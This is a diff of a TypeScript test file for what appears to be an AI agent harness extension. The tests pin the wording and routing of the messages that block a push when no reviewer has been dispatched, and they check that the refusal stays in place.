+  for (const needed of ["do NOT dispatch", "do NOT merge", "THIS REFUSAL IS NOT TERMINAL", "FINAL head"]) {
+    ok(harness.includes(needed), `the harness recovery must include ${JSON.stringify(needed)}`);
+  }
+  // The hedge is what keeps a lane whose brief contradicts the KIND right: it may dispatch if its
+  // own brief says it owns the review.
+  ok(harness.includes("If your brief says you DO have a `task` tool"), "the harness line is not absolute");
+
+  const reviewer = dispatchFloorMessage("standard", "reviewer");
+  ok(!/dispatch a reviewer/i.test(reviewer), "the harness REVIEWER does not dispatch either");
+  for (const needed of ["do not dispatch", "report", "merge-one.sh"]) {
+    ok(reviewer.includes(needed), `the reviewer recovery must include ${JSON.stringify(needed)}`);
+  }
+  // The tier/provenance body is shared, so the role changes the ADVICE and nothing else.
+  for (const role of ["self", "harness", "reviewer"] as const) {
+    ok(
+      dispatchFloorMessage("standard", role).startsWith(BLOCK_MESSAGE),
+      `the ${role} recovery still carries the shipped remediation, not a replacement (${role})`
+    );
+  }
+  // Default is the self role: every existing caller keeps today's text.
+  equal(dispatchFloorMessage("standard"), self, "omitting the role keeps the self-reviewing text");
 });
 
 // ── #517 — BLOCK_MESSAGE repo-layout pin ─────────────
@@ -3731,7 +4271,11 @@ test("#485 T3: micro arm implements block (index.ts shape guard + region no-allo
   // co-drift to "warn" fails here even though T2 compares like-with-like).
   const tokens = [
     "// #485: uniform ≥1-dispatch block",
-    "reason: MICRO_BLOCK_MESSAGE",
+    // #2204: the micro arm returns the micro message through `dispatchFloorMessage`, which is what
+    // appends the tier line. The token moved with the shape; the ARM it pins (micro → micro
+    // remediation, never the generic one) is asserted behaviorally by T1, and the micro-vs-generic
+    // selection is re-pinned below so a message swap cannot hide behind the rename.
+    'return { block: true, reason: dispatchFloorMessage("micro", reviewerRole)',
     "export const TIER_RULE",
     'micro: "block"',
     'standard: "block"',
@@ -3757,14 +4301,21 @@ test("#485 T3: micro arm implements block (index.ts shape guard + region no-allo
   // must be NO `return undefined` (the pre-#485 warn-allow) — the only exits
   // are the micro block return and the generic block return below it.
   // The generic return is the file's FINAL `return { block: true, reason:
-  // BLOCK_MESSAGE }` (merge-gate paths return mergeGateBlockReason, not the
-  // BLOCK_MESSAGE constant): if a revert collapses the micro arm onto the
-  // generic return, a first-occurrence-after-microCheck anchor would bind to
-  // the micro arm's own copy and empty the region vacuously — the full-file
-  // lastIndexOf keeps the slice meaningful.
+  // dispatchFloorMessage(tier, reviewerRole) }` (merge-gate paths return mergeGateBlockReason, not the
+  // block-message builder; #2204 moved the tier line into that builder): if a revert collapses the
+  // micro arm onto the generic return, a first-occurrence-after-microCheck anchor would bind to
+  // the micro arm's own copy and empty the region vacuously — the full-file lastIndexOf keeps the
+  // slice meaningful.
   ok(microCheck !== -1, "micro arm must exist");
-  const genericReturn = src.lastIndexOf("return { block: true, reason: BLOCK_MESSAGE }");
+  const genericReturn = src.lastIndexOf("return { block: true, reason: dispatchFloorMessage(tier, reviewerRole)");
   ok(genericReturn !== -1 && genericReturn > microCheck, "generic block return must follow the micro arm");
+  // #2204: the tier line lives in ONE builder, and the micro arm must not bypass it (a hand-rolled
+  // return of MICRO_BLOCK_MESSAGE would silently drop the tier naming the issue asks for).
+  ok(
+    src.includes("export function dispatchFloorMessage(tier: string, role: ReviewerRole = \"self\"): string") &&
+      (src.match(/dispatchFloorMessage\("micro", reviewerRole\)/g) ?? []).length === 1,
+    "the micro arm routes its message through the shared builder (#2204)"
+  );
   const region = src.slice(microCheck, genericReturn);
   ok(!region.includes("return undefined"), "micro arm region must not contain a warn-allow return undefined (#485)");
   // Absence scan (closes the code-side re-drift hole the plan's Task 3 step 6
@@ -6178,13 +6729,27 @@ testAsync("#2148: the FIRST PUSH at 0 dispatches speaks up, once — and the git
         // logging this while THIS FILE's own comment says a console line is not reliably in a
         // `pi -p` lane's context — so "the lane can then fix it while it still has context" was
         // false. `deliverAs:"steer"` queues it ahead of the next model call.
-        equal(sent.length, 1, "the notice is sent as a session message, exactly once");
-        equal(sent[0].options?.deliverAs, "steer", "…as a steer, so it lands before the next model call");
-        equal(sent[0].message?.content, early[0], "…carrying the very text that was logged");
-        equal(sent[0].message?.customType, "reviewer-preflight", "…attributable to this extension");
+        //
+        // #2204 adds a SECOND model-visible message on this path (the block-recovery followUp), so
+        // the pin is on the pre-flight message by its `customType`, not on `sent.length` — a count
+        // would make any future model-visible disclosure look like a regression of this one.
+        const preflightSends = sent.filter((s) => s.message?.customType === "reviewer-preflight");
+        equal(preflightSends.length, 1, "the notice is sent as a session message, exactly once");
+        equal(preflightSends[0].options?.deliverAs, "steer", "…as a steer, so it lands before the next model call");
+        equal(preflightSends[0].message?.content, early[0], "…carrying the very text that was logged");
+        equal(preflightSends[0].message?.customType, "reviewer-preflight", "…attributable to this extension");
+        // THE COUNT, restored as an invariant rather than a bare number: on this path exactly TWO
+        // model-visible messages exist — this notice and #2204's block recovery — and nothing else.
+        // A third one is a disclosure nobody decided on, which is the thing a bare `length` pin was
+        // protecting before it was relaxed to a filter.
+        equal(
+          sent.map((s) => s.message?.customType).sort().join(","),
+          "reviewer-block-recovery,reviewer-preflight",
+          "exactly the two decided model-visible messages are delivered on this path (#2148 + #2204)"
+        );
         // The existing refusal is UNCHANGED — the disclosure adds a notice, never a bypass.
         ok(first && first.block === true, "the push is still refused at 0 dispatches");
-        equal(first.reason, BLOCK_MESSAGE, "…with the existing block message");
+        ok(first.reason.startsWith(BLOCK_MESSAGE), "…with the existing block message");
         ok(second && second.block === true, "and a later push is refused too (the notice is once, the gate is not)");
         const audit = tempAuditLines();
         equal(audit.filter((l) => l.event === "reviewer_preflight" && l.phase === "first_push").length, 1,
